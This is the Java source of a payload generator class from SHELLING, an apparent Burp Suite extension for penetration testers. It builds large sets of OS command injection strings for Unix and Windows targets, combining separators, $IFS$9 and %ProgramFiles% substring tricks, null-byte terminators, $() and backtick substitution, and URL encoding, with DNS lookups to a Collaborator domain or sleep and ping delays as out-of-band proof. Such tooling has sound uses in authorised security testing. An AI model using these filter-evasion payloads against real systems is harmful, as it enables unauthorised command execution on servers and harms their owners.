package uk.co.pentest.SHELLING;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IIntruderPayloadGenerator;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.ListModel;

/**
 *
 * @author julianh
 */
public final class IntruderPayloadGenerator implements IIntruderPayloadGenerator 
{
    IBurpExtenderCallbacks callbacks = BurpExtender.getBurpCallbacks();
    ShellingTab tab;
    
    int payloadIndex;                   // counter for the getNextPayload and hasMorePayloads methods
    boolean payloadMarking;             // whether or not to use payload marking
    Integer cnt=0;                      // counter for the payload marker    
    String payloadType;                 // cmd or mark

    ArrayList<String> shellings;        // the final payloads
    ArrayList<String> shellings_raw;    // payloads before output encoding  
    ArrayList<String> basePayloads;     // my @BASE_PAYLOADS=($PAYL);
    

    ArrayList<String> argumentSeparators;        // my @ARGUMENT_SEPARATORS=('%20%20',"%09%09");
    ArrayList<String> commandSeparators;         // my @COMMAND_SEPARATORS=('%0a%0a','%26','|');
    ArrayList<String> commandTerminators;        // my @COMMAND_TERMINATORS=("%00",'%F0%9F%92%A9');
    ArrayList<String> nixCommandSeparators;
    ArrayList<String> nixArgumentSeparators;      
    ArrayList<String> nixCommandTerminators;
    ArrayList<String> winCommandSeparators;
    ArrayList<String> winArgumentSeparators;
    ArrayList<String> winEchoArgumentSeparators;
    ArrayList<String> prefixes;
    ArrayList<String> prefixSuffixes;   
    String command;
    String argument;
    String targetOS;
    String payload;                     // the base payload in high level form ({COMMAND}{SEPARATOR}{ARGUMENT})

    String winPayload;                  // the base payload in high level form ({COMMAND}{SEPARATOR}{ARGUMENT})
    String nixPayload;                  // will differ if the feedback channel is time (as opposed to DNS, whereas nslookup call looks exactly the same)
    String feedbackChannel;
    String mode="auto"; // possible values: auto (scanner + intruder), manual (intruder only)

    public IntruderPayloadGenerator(String payloadType, ShellingTab tab, String currentAction)
    {
        // currentAction possible values
        // scanner
        // intruder
        // export
        
        // activeScan is true for Scanner calls only (as opposed to Intruder and external export calls)        
        this.payloadType = payloadType;
        this.tab=tab;               
        
        mode=this.tab.shellingPanel.mode;
        shellings=new ArrayList<String>();
        shellings_raw=new ArrayList<String>();
        basePayloads=new ArrayList<String>();        
        argumentSeparators=new ArrayList<String>();
        argumentSeparators=new ArrayList<String>();
        commandSeparators=new ArrayList<String>();         // my @COMMAND_SEPARATORS=('%0a%0a','%26','|');
        commandTerminators=new ArrayList<String>();        // my @COMMAND_TERMINATORS=("%00",'%F0%9F%92%A9');
        nixCommandSeparators=new ArrayList<String>();
        nixArgumentSeparators=new ArrayList<String>();
        nixCommandTerminators=new ArrayList<String>();
        winCommandSeparators=new ArrayList<String>();
        winArgumentSeparators=new ArrayList<String>();
        winEchoArgumentSeparators=new ArrayList<String>();
        prefixes=new ArrayList<String>();
        prefixSuffixes=new ArrayList<String>();
                
        // Collecting user configuration from the panel interface
        //this.prefixes.add(this.tab.shellingPanel.commandPrefixField.getText());          
        this.prefixes.add("PREFIX_HOLDER"); // this will be replaced in a late (getNextPayload() in the IntruderPayloadGenerator) stage by the base payload
        this.prefixSuffixes.add("'");
        this.prefixSuffixes.add("\"");
        if(this.tab.shellingPanel.payloadMarkingBox.isSelected())
        {
            this.payloadMarking=true;
        }
        else
        {
            this.payloadMarking=false;
        }                   
        
        targetOS=this.tab.shellingPanel.targetOS; 
        command=this.tab.shellingPanel.commandField.getText();
        argument=this.tab.shellingPanel.argumentField.getText().trim();
        
        // in case of argument injection, we'll set argument to PARAM_INJECTION_STRING  ARGUMENT_SEPARATOR EVIL_PARAM , so it will follow the first occurrence of ARGUMENT_SEPARATOR
        
        // OK, let's roll
        // the new way
        // 
        if(currentAction=="scanner")
        {               
            this.feedbackChannel=this.tab.shellingPanel.feedbackChannel;     
            if(mode=="auto")
            {
                if(feedbackChannel=="DNS")
                {                
                    // fetch the domain from collaborator, then prepend with the payload mark                                                          
                    command="nslookup";
                    if(payloadMarking) 
                    {
                       argument="PAYLOAD_MARK.BURP_COLLAB_DOMAIN";
                    }
                    else
                    {
                        argument="BURP_COLLAB_DOMAIN";
                    }                
                    winPayload=nixPayload=command+"ARGUMENT_SEPARATOR"+argument;                
                }
                else // time
                {
                    winPayload="pingARGUMENT_SEPARATOR-nARGUMENT_SEPARATOR25ARGUMENT_SEPARATOR127.0.0.2";
                    nixPayload="sleepARGUMENT_SEPARATOR25";
                    command="sleep";
                    argument="25";
                }
            }
            else
            {
                winPayload=nixPayload=command+"ARGUMENT_SEPARATOR"+argument;                    
            }
        }
        else // Intruder or external export (activeScan = false)
        {
            payload=command+"ARGUMENT_SEPARATOR"+argument;    
        }
        
        
        
        // let's initiate the building element variables
        // universal argument separators
        this.argumentSeparators.add(" "); // space 
        this.argumentSeparators.add(this.byteToString((byte)0x09)); // 09, horizontal tab
        
        // universal command separators
        this.commandSeparators.add(this.byteToString((byte)0x0a));  // newline
        this.commandSeparators.add("&");                            // ampersand
        this.commandSeparators.add("|");                            // pipe
        
        // command/string terminators
        // this.commandTerminators.add("ðŸ’©");                           // the poo character, this should only work with asynchronous strings entering a mysql database first, should be disabled by default
        this.commandTerminators.add(this.byteToString((byte)0x00));     // nullbyte

        // OS-specific command separators
        // nix-like command separators
        this.nixCommandSeparators.add(";");                             // semicolon
        
        // nic-like argument separators
        this.nixArgumentSeparators.add("$IFS$9");                       // $IFS$9
        
        this.nixCommandTerminators.add(" #");
        
        this.winCommandSeparators.add(this.byteToString((byte)0x1a));
        
        this.winArgumentSeparators.add(this.byteToString((byte)0x0b));
        this.winArgumentSeparators.add("%25ProgramFiles:~10,1%25");
        
        
        this.winEchoArgumentSeparators.add("(");
        this.winEchoArgumentSeparators.add(".");    
        
        this.winCommandSeparators.add(this.byteToString((byte)0x26)+"::");
        
        // let's start building
        basePayloads.add(payload);
        if("nix".equals(targetOS)||"all".equals(targetOS))
        {
            this.basePayloads.add("$("+payload+")");
            this.basePayloads.add("`"+payload+"`");
            this.basePayloads.add("{"+command+","+argument+"}");// the brace operator
            
            for(int i=0;i<this.nixCommandSeparators.size();i++)
            {
                this.commandSeparators.add(this.nixCommandSeparators.get(i));
            }
            for(int i=0;i<this.nixArgumentSeparators.size();i++)
            {
                this.argumentSeparators.add(this.nixArgumentSeparators.get(i));
            } 
        }
        
        if("win".equals(targetOS)||"all".equals(targetOS))
        {        
            for(int i=0;i<this.winCommandSeparators.size();i++)
            {
                this.commandSeparators.add(this.winCommandSeparators.get(i));
            }            
            for(int i=0;i<this.winArgumentSeparators.size();i++)
            {
                this.argumentSeparators.add(this.winArgumentSeparators.get(i));
            } 
            /*
            soon to be implemented, temporarily commented out
            if(command.equals("echo"))          
            {
                for(int i=0;i<this.winEchoArgumentSeparators.size();i++)
                {
                    this.argumentSeparators.add(this.winEchoArgumentSeparators.get(i));
                    this.winArgumentSeparators.add(this.winEchoArgumentSeparators.get(i));
                } 
            }
            */
            
        }
        
        // automatically prefix prefixes with quotes in order to gain quoted injection compatibility
        ArrayList<String> tmpPrefixes=new ArrayList<>();
        tmpPrefixes=(ArrayList<String>)prefixes.clone();
        for(int i=0;i<tmpPrefixes.size();i++)
        {
            for(int j=0;j<prefixSuffixes.size();j++)
            {
                prefixes.add(tmpPrefixes.get(i)+this.prefixSuffixes.get(j));
            }
        }              
        
        // 1) First, we fill our output payloads list wth all variations of base payloads, including different argument separators
        // levels: all (1,2,3)
        for(int i=0;i<this.argumentSeparators.size();i++)
        {
           for(int j=0;j<this.basePayloads.size();j++)
           {
               String myCurrPayload=this.basePayloads.get(j);
               if(this.incompatibleTargets(this.argumentSeparators.get(i), myCurrPayload, "separator"))
               {
                   continue; 
               }
               myCurrPayload=myCurrPayload.replace("ARGUMENT_SEPARATOR",this.argumentSeparators.get(i));               
               if(!this.shellings_raw.contains(myCurrPayload)) this.shellings_raw.add(myCurrPayload);               
           }
        }
        
        this.basePayloads=(ArrayList<String>)this.shellings_raw.clone();   // overwrite the base with different base command_separator variants        
        
        // 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR 
        if(this.tab.shellingPanel.shellingLevel>1)
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandTerminators.size();j++)
            {
                if(this.incompatibleTargets(this.commandTerminators.get(j),this.basePayloads.get(i),"terminator"))
                {
                    continue;
                }
                String currPayload=this.basePayloads.get(i)+this.commandTerminators.get(j);
                if(!this.shellings_raw.contains(currPayload)) this.shellings_raw.add(currPayload);
            }
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }                
                if(!this.shellings_raw.contains(this.basePayloads.get(i)+this.commandSeparators.get(j))) this.shellings_raw.add(this.basePayloads.get(i)+this.commandSeparators.get(j));                             
            }
        }
        // 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND
        if(this.tab.shellingPanel.shellingLevel>1)
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                if(!this.shellings_raw.contains(this.commandSeparators.get(j)+this.basePayloads.get(i))) this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i));                                
            }
        }
        // 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
        // I think this makes the above section 3) redundant, because:
        // - if the application is appending our payload with something, 3) will fail, while 4) will work
        // - if the application is not accepting COMMAND_SEPARATOR, both variants will fail, so 3) is not helping anyway
        // - if the application is rejecting values that do not end with alphanum (which is how any of our MALICIOUS_COMMANDS would end), 4) will fail - but this is why we have the + SUFFIX variant - 5) - right?
        if(this.tab.shellingPanel.shellingLevel>1)
        //levels: 2 and 3
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                //this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j));   
                 if(!this.shellings_raw.contains(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j))) this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j));                
            }
        }
        // 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX    
        if(this.tab.shellingPanel.shellingLevel>2)
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                for(int k=0;k<this.prefixes.size();k++)
                {
                  String suffix=this.prefixes.get(k);
                  if(suffix=="'"||suffix=="") 
                  {
                      continue; //skip irrelevant payloads                  
                  }                  
                  if(!this.shellings_raw.contains(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix)) this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix);                             
                }
            }
        }
        // 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                } 
                for(int k=0;k<this.prefixes.size();k++)
                {
                    String currPayload=this.prefixes.get(k)+this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j);
                    if(currPayload.contains("'"))
                    {
                        currPayload=currPayload+"'";
                    }
                    else if(currPayload.contains("\""))
                    {
                        currPayload=currPayload+"\"";
                    }
                    if(!this.shellings_raw.contains(currPayload)) this.shellings_raw.add(currPayload);
                }
            }
        }
        // 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX 
        // levels: 2,3
        if(this.tab.shellingPanel.shellingLevel>1)
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                for(int k=0;k<this.prefixes.size();k++)
                {
                  String suffix=this.getProperSuffix(this.prefixes.get(k));                 
                  if(!this.shellings_raw.contains(this.prefixes.get(k)+this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix)) this.shellings_raw.add(this.prefixes.get(k)+this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix);                              
                }
            }
        }    
        
        // 8) PREFIX+MALICIOUS_COMMAND+SUFFIX for substitutions - `CMD` and $(CMD) 
        
        
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.prefixes.size();j++)
            {
                String basePayload=this.basePayloads.get(i);          
                if(!basePayload.startsWith("$")&&!basePayload.startsWith("`"))
                {                   
                    continue;
                }
                String prefix=this.prefixes.get(j);
                String suffix=this.getProperSuffix(prefix);
                if(!this.shellings_raw.contains(prefix+basePayload+suffix)) this.shellings_raw.add(prefix+basePayload+suffix);
            }
        }                
        // OK, what's left now is the output encoding + payload marking

        // now we have to deal with the output encodings
        ListModel encodeModel = this.tab.shellingPanel.encodeList.getModel();
        for(int j=0;j<this.shellings_raw.size();j++)
        {
            for(int i=0;i<encodeModel.getSize();i++)
            {
                if("None".equals(encodeModel.getElementAt(i).toString()))
                {                   
                    String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                    this.shellings.add(outputPayload);
                }
                if("URL".equals(encodeModel.getElementAt(i).toString())) // URL encode
                {
                   String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                   try {                    
                    this.shellings.add(URLEncoder.encode(outputPayload,StandardCharsets.UTF_8.toString()));
                    } 
                   catch (UnsupportedEncodingException ex) {
                      Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                if("Double URL".equals(encodeModel.getElementAt(i).toString()))
                {
                       String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                       try {                       
                           this.shellings.add(URLEncoder.encode(URLEncoder.encode(outputPayload,StandardCharsets.UTF_8.toString())));
                       } 
                       catch (UnsupportedEncodingException ex) {
                           Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                       }
                }
            }
        }
   
    }
    private String getMarkedVersion(String payload)
    {        
        cnt++;
        if(this.payloadMarking)
        {
            String replacement=cnt.toString();
            if(payload.contains("$IFS$9")) // if dealing with $IFS$9
            {
                replacement="a"+replacement;
            }   
            payload=payload.replace("PAYLOAD_MARK",replacement);
        }
        else
        {
            payload=payload.replace("PAYLOAD_MARK","");
        }
        return payload;
    }
    private String byteToString(byte inputByte)
    {
        byte[] t = new byte[1];
        t[0]=inputByte;
        return callbacks.getHelpers().bytesToString(t);
    }    
    private boolean arraySearch(String needle, String[] hayStack)
    {
        for(int i=0;i<hayStack.length;i++)
        {
            if(hayStack[i]==needle) return true;
        }
        return false;
    }
    private String[] toStringArray(ArrayList<String> input)
    {
        String ret[];
        ret = new String[input.size()];
        for(int i=0;i<ret.length;i++)
        {
            ret[i]=input.get(i);
        }
        return ret;
    }
    private boolean incompatibleTargets(String entity, String payload, String what)
    {
        if(targetOS!="all") return false; // it's either strictly win or nix - in such case there should be no incompatible elements in the configuration in the first place
        // this might become false if we allow people to play with the the separators themselves (define their own ones)
        // in such case we'll remove this lind and perform the check every time this function is called
        // we discover the OS based on the existence of an OS-specific separator (ARGUMENT SEPARATOR)
        
        String cmdPattern = command+"(.*)"+argument;
        String separator="";
               
        Pattern pattern = Pattern.compile(cmdPattern);
        Matcher matcher = pattern.matcher(payload);
        this.tab.shellingPanel.logOutput("Matching "+payload+" against "+cmdPattern+"\n");
        if(matcher.matches())
        {
            separator=matcher.group(1);
            this.tab.shellingPanel.logOutput("Separator extracted: "+separator);
        }
        else
        {
            this.tab.shellingPanel.logOutput("Warning: no match was hit.\n");
            separator="";        
        }
        
        // whether the payload seems nix-like
        if(payload.contains("`")||payload.contains("$")||arraySearch(separator,this.toStringArray(this.nixArgumentSeparators)))
        {
            if("separator".equals(what))
            {
                if(arraySearch(entity,this.toStringArray(this.winArgumentSeparators)))
                {
                    return true;
                }
                if(arraySearch(entity,this.toStringArray(this.winCommandSeparators)))
                {
                    return true;
                }               
                return false;
            }
            if("terminator".equals(what))
            {
                if(arraySearch(entity,this.toStringArray(this.winCommandSeparators)))
                {
                    return true;
                }
                return false;
            }
            return false; 
        }
        if(arraySearch(separator,this.toStringArray(winArgumentSeparators))) // dealing with windows
        {
            if("separator".equals(what))
            {
                if(arraySearch(entity,this.toStringArray(this.nixCommandSeparators)))
                {
                  return true;   
                }
                if(arraySearch(entity,this.toStringArray(this.nixArgumentSeparators)))
                {
                  return true;   
                }
                return false;
            }
            if("terminator".equals(what))
            {
                if(arraySearch(entity,this.toStringArray(this.nixCommandTerminators)))
                {
                    return true;
                }
                return false;
            }
        }       
        return false;
    }
    private String getProperSuffix(String prefix)
    {
        String suffix=prefix;
        if(prefix.contains("'"))
        {
            suffix=suffix.replace("'","");
            suffix="'"+suffix;
        }
        else if(prefix.contains("\""))
        {
            suffix=suffix.replace("\"","");
            suffix="\""+suffix;
            
        }        
	return suffix;
    }
    @Override
    public boolean hasMorePayloads() 
    {
      return this.payloadIndex < this.shellings.size();      
    }
    public String getPayload(int index)
    {
        if(index<this.shellings.size()) return this.shellings.get(index);
        return "";
    }
    @Override
    public byte[] getNextPayload(byte[] baseValue) 
    {                
        byte[] payload  = new byte[0];
        if("mark".equals(this.payloadType))
        {
            payload=callbacks.getHelpers().stringToBytes(Integer.toString(this.payloadIndex));
        }
        if("cmd".equals(this.payloadType))
        {
            // return the path payload
            String p = this.shellings.get(this.payloadIndex);
            if(p.contains("PREFIX_HOLDER"))
            {                
                String base = callbacks.getHelpers().bytesToString(baseValue);
                p=p.replace("PREFIX_HOLDER",base);
            }
            payload = callbacks.getHelpers().stringToBytes(p);           
        }
        this.payloadIndex++; // increase the index
        return payload;
    }
    @Override
    public void reset() 
    {        
        payloadIndex = 0;
    }       
}